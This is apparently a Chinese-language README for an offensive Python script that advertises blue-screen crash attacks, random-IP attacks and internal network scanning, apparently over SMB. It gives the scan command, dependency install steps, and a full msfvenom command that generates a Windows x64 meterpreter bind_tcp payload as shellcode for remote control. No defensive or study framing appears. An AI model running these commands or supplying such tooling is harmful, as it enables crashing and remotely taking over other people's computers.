本脚本有蓝屏攻击, 随机IP攻击功能, 内网扫描
扫描内网的指令
./main.py local

本模块需要netaddr模块
使用指令安装
python3 -m pip install netaddr 或者 pip install netaddr

smbprotocol模块无需手动下载

生成远程控制载荷
	msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f python -o shellcode.txt

本脚本的远程控制代码在网上参考
